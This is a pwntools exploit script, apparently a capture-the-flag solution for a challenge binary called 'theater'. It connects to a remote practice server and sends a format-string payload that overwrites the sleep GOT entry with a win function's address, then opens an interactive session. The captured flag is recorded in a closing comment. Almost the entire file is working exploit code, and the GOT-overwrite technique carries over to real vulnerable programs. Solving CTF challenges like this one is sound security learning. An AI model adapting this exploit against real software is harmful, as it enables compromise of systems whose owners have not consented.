from pwn import *

#defines
WIN = 0x0000000000401316
SLEEP_GOT = 0x404068

def main():
    ### context ###
    binary = ELF('./theater')
    context.binary = binary

    ### run ###
    #p = process('./theater')
    p = remote("pwnable.co.il", 9011) 

    ### payload start ###
    first_target_address = SLEEP_GOT
    fmt_offset = 6
    payload = fmtstr_payload(fmt_offset, {
        first_target_address: WIN,   
    })
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main() 

#flag: PWNIL{GOT_overwrites_are_a_problem_we_need_to_take_more_seriously}